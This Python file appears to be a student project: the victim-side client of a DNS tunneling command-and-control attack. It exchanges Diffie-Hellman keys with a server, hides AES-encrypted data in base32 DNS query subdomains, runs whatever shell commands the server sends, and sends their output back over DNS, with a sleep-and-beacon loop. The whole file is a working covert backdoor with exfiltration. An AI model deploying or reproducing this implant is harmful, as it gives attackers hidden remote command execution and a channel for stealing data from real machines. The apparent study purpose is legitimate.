"""
Shachar Markovich 211491766
Naor Maman        207341777
"""
# region imports
import subprocess

try:
    import pyDH
except ModuleNotFoundError:
    subprocess.Popen(['pip3', 'install', 'pyDH'])
    import pyDH

try:
    from scapy.all import *
except ModuleNotFoundError:
    subprocess.Popen(['pip3', 'install', 'scapy'])
    from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP

try:
    from Crypto.Cipher import AES
except ModuleNotFoundError:
    subprocess.Popen(['pip3', 'install', 'pycryptodome'])
    from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

try:
    import secrets
except ModuleNotFoundError:
    subprocess.Popen(['pip3', 'install', 'secrets'])
    import secrets

import time
import base64
import platform

# endregion
tmp_msg = b''
TYPES = {'A': 1, 'AAAA': 28, 'CNAME': 5, 'TXT': 16}
DOMAIN = b".resh.gimel."
MAX_CHARS_IN_SUBDOMAIN = 63
MAX_DOMAIN = 255 - len(DOMAIN) - 9 - 9 - 1  # `-9` for the code in base32 and `-9` for the identify number
CLIENT_COMMANDS = {'keyExchange1': 101, 'keyExchange3': 103, 'ok&ans': 201, 'awake': 300, 'ok&retransmission': 401,
                   'more': 501, 'next': 502, 'last': 503, 'ok&continue': 504}
SERVER_COMMANDS = {'keyExchange2': 102, 'ok&process': 200, 'ok&sleep': 301, 'error&retransmission': 400,
                   'more': 501, 'next': 502, 'last': 503, 'ok&continue': 504}

os_type: str = platform.system()
identify: bytes = secrets.token_hex(nbytes=4).encode()  # identify number
dh = pyDH.DiffieHellman()
dH_pubkey: int = dh.gen_public_key()
shared_key = None


def cipher_obj(key: bytes):
    """
    Creating an AES cipher block for encrypting & decrypting.
    The cipher object is working only once - so we recreating it every encrypting/decrypting.

    :param key: the encrypting-decrypting shared key.
    :returns: AES cipher block for encrypting/decrypting.
    """
    return AES.new(key[:32], AES.MODE_CBC, iv=key[33:49])


def key_exchange():
    """
    Diffie Hellman key exchanging with the server.
    :returns: code and command to preform
    """
    global shared_key
    global os_type

    # encode the victim public key with base32 and send it to the server
    base32_public_key = build_req(CLIENT_COMMANDS['keyExchange1'], dH_pubkey.to_bytes(256, 'little'))

    # get the public key of the server and generate the shared key:
    the_code, base32_server_dh_pubkey = send_req_recv_res(base32_public_key)
    server_dh_pubkey = base64.b32decode(base32_server_dh_pubkey)
    shared_key = dh.gen_shared_key(int.from_bytes(server_dh_pubkey, 'little')).encode()

    # send the victim os type and with it finish the key exchanging
    os_type = build_req(CLIENT_COMMANDS['keyExchange3'], platform.system().encode())
    return send_req_recv_res(os_type)  # return the next command to perform and it's code


def build_req(cmd_code: int, msg: bytes):
    """
    Building the fake url to be send in fake DNS request to server.
    :param cmd_code: the fake url's code.
    :param msg: the data.
    :return: an encrypted message in AES, encoded to base32 with '.' every 63 chars
    """
    # we encrypt the message only after the key exchange
    if shared_key:
        aes_encrypting = cipher_obj(shared_key)
        encrypted_msg = aes_encrypting.encrypt(pad(msg, AES.block_size))
        base32_msg = base64.b32encode(encrypted_msg)
    else:
        base32_msg = base64.b32encode(msg)

    # check if the length of the message is more than 63 allowed chars between 2 dots:
    if len(base32_msg) > MAX_CHARS_IN_SUBDOMAIN:
        # add a dot between every 63 chars
        i = MAX_CHARS_IN_SUBDOMAIN
        while i < len(base32_msg):
            base32_msg = base32_msg[:i] + b'.' + base32_msg[i:]
            i += MAX_CHARS_IN_SUBDOMAIN

    return base64.b32encode(str(cmd_code).encode()) + b'.' + base32_msg


def send_req_recv_res(fake_domain: bytes):
    """
    Send the given request domain to the server, get the response
    and parse from it the code and the next operation.
    :param fake_domain: the fake domain with the answer to the server.
    :return: response code and next operation
    """
    # The url's maximum length in a DNS request is 255 characters.
    # If we have more than it - we need to split it into separate requests and send each one of them.
    if len(fake_domain) > MAX_DOMAIN:
        enc_codes = [base64.b32encode(str(CLIENT_COMMANDS['more']).encode()),
                     base64.b32encode(str(CLIENT_COMMANDS['next']).encode()),
                     base64.b32encode(str(CLIENT_COMMANDS['last']).encode())]

        # send first part of answer:
        qname = identify + b'.' + enc_codes[0] + b'.' + fake_domain[:MAX_DOMAIN] + DOMAIN
        send_req(qname)

        # send the inner parts of the answer:
        i = MAX_DOMAIN
        while i + MAX_DOMAIN < len(fake_domain):
            qname = identify + b'.' + enc_codes[1] + b'.' + fake_domain[i:i + MAX_DOMAIN] + DOMAIN
            send_req(qname)
            i += MAX_DOMAIN

        # send last part of answer:
        qname = identify + b'.' + enc_codes[2] + b'.' + fake_domain[i:] + DOMAIN
        return send_req(qname)  # return the next operation and its code

    else:
        return send_req(identify + b'.' + fake_domain + DOMAIN)  # return the next operation and its code


def send_req(qname: bytes):
    """
    Send the DNS request with the answer to the Authoritative DNS server.
    :param qname: the fake url
    :return: code of answer, next command to perform.
    """
    cmd_code, command = SERVER_COMMANDS['error&retransmission'], ""
    while cmd_code == SERVER_COMMANDS['error&retransmission']:
        # create the DNS query and send it:
        # todo: get automatically the local dns server ip
        dns_req = IP(dst='10.0.2.7') / UDP(sport=234, dport=53) / DNS(rd=1, qd=DNSQR(qname=qname, qtype='CNAME'))
        response = sr1(dns_req, verbose=False)
        cmd_code, command = parse_response(response[DNSRR])

        # check if more parts are need to be send
        if cmd_code == SERVER_COMMANDS['more']:
            tmp_data = command
            while cmd_code != SERVER_COMMANDS['last']:
                # send an 'ACK' to server and parse the next part:
                fake_domain = identify + b'.' + build_req(CLIENT_COMMANDS['ok&continue'], b'continue') + DOMAIN
                dns_req = IP(dst='10.0.2.7') / UDP(sport=234, dport=53) / DNS(rd=1, qd=DNSQR(qname=fake_domain,
                                                                                             qtype='CNAME'))
                response = sr1(dns_req, verbose=False)
                cmd_code, command = parse_response(response[DNSRR])
                tmp_data += command  # save the parts in temp var
            command = tmp_data

    return cmd_code, command


def parse_response(dns_response: DNSRR):
    """
    parse the code and command from the dns response from server.
    :param dns_response: DNS RR from the server
    :return: next command to perform and its code.
    """
    # encode response format: base32(code).base32(command).resh.gimel.
    enc_response = dns_response.rdata

    if dns_response.type == TYPES['TXT']:
        enc_response = enc_response[0]  # this is the syntax of TXT rdata response in scapy

    enc_response = enc_response[:-len(DOMAIN)]  # remove the fake domain name
    enc_code, enc_response = enc_response.split(b'.', 1)  # split to code and encoded message
    cmd_code = base64.b32decode(enc_code).decode()  # decode the code

    try:
        cmd_code = int(cmd_code)
    except ValueError:  # error - the code isn't a number.
        return SERVER_COMMANDS['error&retransmission'], 'command code is not valid'

    # check if it this command it's the first part between other parts:
    if cmd_code == SERVER_COMMANDS['more']:
        # todo: maybe we need to do something with `real_enc_code`?
        real_enc_code, enc_response = enc_response.split(b'.', 1)  # split to code and enc msg
        dec_response = enc_response.replace(b'.', b'')  # remove the dots

    # check if it this command is one from other parts:
    elif cmd_code in [SERVER_COMMANDS['next'], SERVER_COMMANDS['last']]:
        dec_response = enc_response.replace(b'.', b'')  # remove the dots

    else:  # else - it this command is the whole command, so we decoded it;
        enc_response = enc_response.replace(b'.', b'')  # remove the dots
        dec_response = decode_msg(enc_response)  # decode the response

    return cmd_code, dec_response


def decode_msg(encrypted_msg: bytes) -> str:
    """
    Get an encrypted message from server and decrypt it.
    :param encrypted_msg: the encrypted message
    :return: plain text message
    """

    base32_msg = base64.b32decode(encrypted_msg)  # decode the response
    # decrypt the encoded msg
    if shared_key:
        aes_decrypting = cipher_obj(shared_key)
        return unpad(aes_decrypting.decrypt(base32_msg), AES.block_size).decode()
    else:
        return base32_msg.decode()


def attack():
    """
    Manage the DNS Tunneling attack.
    """
    # always start with key exchanging with the server
    cmd_code, command = key_exchange()
    print("[!] Successfully connect to server!")
    print("[!] The shared key is:", shared_key)
    while True:
        print("[!] got from server:", command)
        if cmd_code == SERVER_COMMANDS['ok&process']:
            # run the command in the shell...
            try:
                output: bytes = subprocess.Popen(command.strip().split(' '), stdout=subprocess.PIPE).communicate()[0]
            except Exception:
                output: bytes = b'Error: Unknown command!'

            print("[!] send to server:\n", output.decode())
            enc_msg = build_req(CLIENT_COMMANDS['ok&ans'], output)
            cmd_code, command = send_req_recv_res(enc_msg)  # ... and send the result to the server

        elif cmd_code == SERVER_COMMANDS['ok&sleep']:
            print('[!] good night for', command, 'seconds')
            time.sleep(int(command))  # go to sleep

            # send a wakeup message
            print('[!] good an awake msg to server')
            enc_msg = build_req(CLIENT_COMMANDS['awake'], b'awake')
            cmd_code, command = send_req_recv_res(enc_msg)  # ... and send the result to the server


if __name__ == "__main__":
    attack()
